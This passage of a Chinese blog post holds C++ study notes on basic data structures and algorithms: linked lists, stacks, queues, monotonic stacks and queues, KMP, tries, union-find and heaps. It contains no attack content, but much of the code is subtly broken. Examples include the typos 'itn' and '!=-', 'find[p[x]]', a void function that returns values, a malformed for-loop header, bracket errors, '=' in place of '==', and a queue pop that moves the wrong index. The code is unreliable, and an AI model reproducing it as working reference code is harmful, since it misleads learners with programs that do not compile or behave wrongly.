<span class="number">1</span>, l[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    idx = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在第k点右边插入x，左边就为add(l[k], x)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    e[idx] = x;</span><br><span class="line">    r[idx] = r[k];  <span class="comment">// x的右指针就是原来k的右指针</span></span><br><span class="line">    l[idx] = k;</span><br><span class="line">    l[r[k]] = idx;  <span class="comment">// 先把左指针改了（因为要用到k的右指针表示）</span></span><br><span class="line">    r[k] = idx;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除第k个点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove</span><span class="params">(<span class="keyword">int</span> k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    r[l[k]] = r[k]; <span class="comment">// r[l[k]]，里面的l[k]指k左边那个数,r[]就是他的右指针</span></span><br><span class="line">    l[r[k]] = l[k];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、栈和队列"><a href="#2、栈和队列" class="headerlink" title="2、栈和队列"></a>2、栈和队列</h3><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220110162150009.png" alt="image-20220110162150009"></p><h4 id="1、栈"><a href="#1、栈" class="headerlink" title="1、栈"></a>1、栈</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// tt 表示栈顶下标</span></span><br><span class="line"><span class="keyword">int</span> stk[N], tt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入     stk[++ tt] = x;</span></span><br><span class="line"><span class="comment">// 弹出     tt --;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    判断栈是否为空    </span></span><br><span class="line"><span class="comment">    if (tt &gt; 0) not empty;</span></span><br><span class="line"><span class="comment">    else empty;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//取出栈顶      stk[tt];</span></span><br></pre></td></tr></table></figure><h4 id="——单调栈"><a href="#——单调栈" class="headerlink" title="——单调栈"></a>——单调栈</h4><p>常见的应用场景：给定一个序列，求序列中的每一个数，左边离他最近的比他小的数在什么位置</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, tt;</span><br><span class="line"><span class="keyword">int</span> stk[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> x;</span><br><span class="line">        cin &gt;&gt; x;</span><br><span class="line">        <span class="keyword">while</span> (tt &amp;&amp; stk[tt] &gt;= x) tt --;<span class="comment">//如果栈顶元素大于当前待入栈元素，则出栈</span></span><br><span class="line">        <span class="keyword">if</span> (tt) cout &lt;&lt; stk[tt] &lt;&lt; endl;</span><br><span class="line">        <span class="keyword">else</span> cout &lt;&lt; <span class="number">-1</span> &lt;&lt; endl;<span class="comment">//如果栈空，则没有比该元素小的值</span></span><br><span class="line"></span><br><span class="line">        stk[++ tt] = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、队列"><a href="#2、队列" class="headerlink" title="2、队列"></a>2、队列</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// hh表示队头，tt表示队尾</span></span><br><span class="line"><span class="comment">// 在队尾插入元素，在队头弹出元素</span></span><br><span class="line"><span class="keyword">int</span> q[N], hh, tt = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 插入元素     q[++ tt] = x;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//  弹出元素      tt ++;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    判断是否为空</span></span><br><span class="line"><span class="comment">    if (hh &lt;= tt) not empty;</span></span><br><span class="line"><span class="comment">    else empty;</span></span><br><span class="line"><span class="comment">*/</span>   </span><br><span class="line"></span><br><span class="line"><span class="comment">//  取出队头元素    q[hh]</span></span><br></pre></td></tr></table></figure><h4 id="——单调队列"><a href="#——单调队列" class="headerlink" title="——单调队列"></a>——单调队列</h4><p>常见的应用场景：求滑动窗口的最大值和最小值</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220110173121154.png" alt="image-20220110173121154"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">1000010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, k;</span><br><span class="line"><span class="keyword">int</span> a[N], q[N];  <span class="comment">//q[N]存的是数组下标</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;k);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> hh = <span class="number">0</span>, tt = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 判断队头是否已经滑出窗口</span></span><br><span class="line">        <span class="comment">// hh与tt比较，判断队列是否为空 </span></span><br><span class="line">        <span class="comment">// 当前滑动窗口的大小(i - k + 1)</span></span><br><span class="line">        <span class="keyword">if</span> (hh &lt;= tt &amp;&amp; i - k + <span class="number">1</span> &gt; q[hh]) hh ++;</span><br><span class="line">        <span class="comment">// 如果新数比队尾小，队尾r</span></span><br><span class="line">        <span class="keyword">while</span> (hh &lt;= tt &amp;&amp; a[q[tt]] &gt;= a[i]) tt --;</span><br><span class="line">        q[++ tt] = i;                          </span><br><span class="line">        <span class="keyword">if</span> (i &gt;= k - <span class="number">1</span>) <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a[q[hh]]);   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><h3 id="3、KMP"><a href="#3、KMP" class="headerlink" title="3、KMP"></a>3、KMP</h3><p>一个字符串匹配算法，对暴力的那种一一比对的方法进行了优化，使时间复杂度大大降低</p><p>例子：</p><blockquote><p><a href="http://www.ruanyifeng.com/blog/2013/05/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm.html">http://www.ruanyifeng.com/blog/2013/05/Knuth%E2%80%93Morris%E2%80%93Pratt_algorithm.html</a></p><p><a href="https://www.acwing.com/solution/content/14666/">https://www.acwing.com/solution/content/14666/</a></p></blockquote><p>next[i]存储了以i为终点的后缀，和从1开始的长度相等，且这个后缀的长度最长</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111215754892.png" alt="image-20220111215754892"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111222711179.png" alt="image-20220111222711179"></p><p>==这里的next[5]存储的就是3，即能匹配的最长前缀的末尾字符的下标==</p><p>求next[i]思路</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111221414291.png" alt="image-20220111221414291"></p><p>KMP匹配思路</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220111220323339.png" alt="image-20220111220323339"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>, M = <span class="number">1000010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">int</span> ne[N];</span><br><span class="line"><span class="comment">//next数组用来存模式串中每个前缀最长的能匹配前缀子串的结尾字符的下标</span></span><br><span class="line"><span class="keyword">char</span> s[M], p[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; p + <span class="number">1</span> &gt;&gt; m &gt;&gt; s + <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//下标均从1开始</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//求next[]数组</span></span><br><span class="line">    <span class="comment">//j表示匹配成功的长度,i表示q数组中的下标,因为p数组的下标是从1开始</span></span><br><span class="line">    <span class="comment">//的,只有1个时,一定为0,所以i从2开始</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>, j = <span class="number">0</span>; i &lt;= n; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (j &amp;&amp; p[i] != p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (p[i] == p[j + <span class="number">1</span>]) j ++;</span><br><span class="line">        <span class="comment">//成功了就加1</span></span><br><span class="line">        ne[i] = j;</span><br><span class="line">        <span class="comment">//对应其下标</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//j表示匹配成功的长度,因为刚开始还未开始匹配,所以长度为0</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>, j = <span class="number">0</span>; i &lt;= m; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> (j &amp;&amp; s[i] !=- p[j + <span class="number">1</span>]) j = ne[j];</span><br><span class="line">        <span class="comment">//j没有回到开始，且已经匹配好的位置的下一项不再匹配</span></span><br><span class="line">        <span class="comment">//就把比较的小串继续再往后移一次，再比较一次</span></span><br><span class="line">        <span class="keyword">if</span> (s[i] == p[j + <span class="number">1</span>]) j ++;</span><br><span class="line">        <span class="comment">//匹配成功了,那么j就加1,继续后面的匹配</span></span><br><span class="line">        <span class="keyword">if</span> (j == n)     <span class="comment">//满足匹配条件，打印开头下标, 从0开始</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, i - n);</span><br><span class="line">            <span class="comment">//因为题目中的下标从0开始,所以i-j不用+1;</span></span><br><span class="line">            j = ne[j];</span><br><span class="line">            <span class="comment">//为了观察其后续是否还能跟S数组后面的数配对成功</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-Tire树"><a href="#4-Tire树" class="headerlink" title="4.Tire树"></a>4.Tire树</h3><p>用来快速存储和查找字符串集合的数据结构</p><p>一般用到tire树的题目，字符串的类型较为单一</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220113155914928.png" alt="image-20220113155914928"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> str[N];</span><br><span class="line"></span><br><span class="line"><span class="comment">//cnt[]存储当前用到的下标</span></span><br><span class="line"><span class="comment">//下标是0的节点，既是根节点，又是空节点</span></span><br><span class="line"><span class="keyword">int</span> son[N][<span class="number">26</span>], cnt[N], idx;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">char</span> str[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; str[i]; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> u = str[i] - <span class="string">&#x27;a&#x27;</span>;     <span class="comment">//看当前节点对应的子节点的编号</span></span><br><span class="line">        <span class="keyword">if</span> (!son[p][u]) son[p][u] = ++ idx;</span><br><span class="line">        p = son[p][u];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cnt[p] ++;      <span class="comment">//以这个点为结尾的单词多了一个</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//询问是否存在单词</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">(<span class="keyword">char</span> str[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, str[i]; i ++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> u = str[i] - <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!son[p][u]) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        p = son[p][u];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> cnt[p];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">[</span></span><br><span class="line"><span class="function">    <span class="keyword">int</span> n</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> op[<span class="number">2</span>];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s%s&quot;</span>, op, str);</span><br><span class="line">        <span class="keyword">if</span> (op[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span>) <span class="built_in">insert</span>(str);</span><br><span class="line">        <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, <span class="built_in">query</span>(str));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><h3 id="5-并查集"><a href="#5-并查集" class="headerlink" title="5.并查集"></a>5.并查集</h3><p>一般作用：</p><p>​                1.将两个集合合并</p><p>​                2.询问两个元素是否在一个集合当中</p><p>基本原理：每个集合用一个树的方式来维护，树根的编号就是集合的编号，每个节点存储它的父节点，p[x]表示x的父节点</p><p>1.通过<code>if (p[x] == x)</code>判断树根                    </p><p>2.通过<code>while (p[x] != x) x = p[x]</code>来求x的集合编号</p><p>3.怎样合并两个集合？    —— px是x的集合编号，py是y的集合编号。p[x] = y</p><p>优化：搜一遍之后，所有节点直接指向根节点（路径压缩）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> n, m;</span><br><span class="line"><span class="keyword">int</span> p[N];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(itn x)</span>     <span class="comment">//返回x的祖宗节点+ 路径压缩</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (p[x] != x)  p[x] = find[p[x]];</span><br><span class="line">    <span class="keyword">return</span> p[x];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    cin &gt;&gt; n &gt;&gt; m;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i ++) p[i] = i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (m --)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">char</span> op[<span class="number">2</span>];     <span class="comment">//scanf()的话最好多开1个，防止空格干扰，用字符串来读字母</span></span><br><span class="line">        <span class="keyword">int</span> a, b;</span><br><span class="line">        cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">        <span class="keyword">if</span> (op[<span class="number">0</span>] = <span class="string">&#x27;M&#x27;</span>) p[<span class="built_in">find</span>(a)] = <span class="built_in">find</span>(b);  <span class="comment">//让a成为b根节点的子节点</span></span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">find</span>(a) == <span class="built_in">find</span>(b)) <span class="built_in">puts</span>(<span class="string">&quot;YES&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="built_in">puts</span>(<span class="string">&quot;NO&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-堆"><a href="#6-堆" class="headerlink" title="6.堆"></a>6.堆</h3><p>目标操作:</p><p>​        1,插入一个数：<code>heap[++ size] = x;  up(size);</code> 插到末尾，再向上移</p><p>​        2.求集合中的最小值：<code>hrap(1)</code>                            </p><p>​        3.删除最小值：<code>heap[1] = heap[size]; size --; down(1)]</code>要把最小值（根节点删除），先将整个堆的                                   最后一个元素覆盖堆顶的元素                        </p><p>​        4.删除任意一个元素：<code>heap[k] = heap[size]; size --; down(k); up(k);</code>down一遍，up一遍，让大                                              数向下，让小数向上</p><p>​        5.修改任意一个元素：<code>heap[k] = x; down(k); up(k)</code>                </p><p>堆的基本结构：完全二叉树</p><p>小根堆的特性：父节点的值小于等于左右两个子节点的值，根节点就是整个树的最小值</p><p>堆的存储：使用一维数组，父节点1，子节点2x, 2x + 1</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220113172828420.png" alt="image-20220113172828420"></p><p>例题：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> N = <span class="number">100010</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ph表示堆数组中下标到第k个插入的映射(存第几个插入的数) —— ph[j] = i, ph放插入数下标j返回堆数组下标i</span></span><br><span class="line"><span class="comment">//hp是第k个插入到堆数组中的下标的映射(记录插入数在堆中的位置) —— hp[i] = j, hp放堆数组下标i返回插入数下标j</span></span><br><span class="line"><span class="comment">//如果hp[u]=k 则ph[k]=u</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//cnt是总元素数</span></span><br><span class="line"><span class="keyword">int</span> n, m = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> h[N], ph[N], hp[N], cnt;   </span><br><span class="line"></span><br><span class="line"><span class="comment">//保证双向指针的指向正确</span></span><br><span class="line"><span 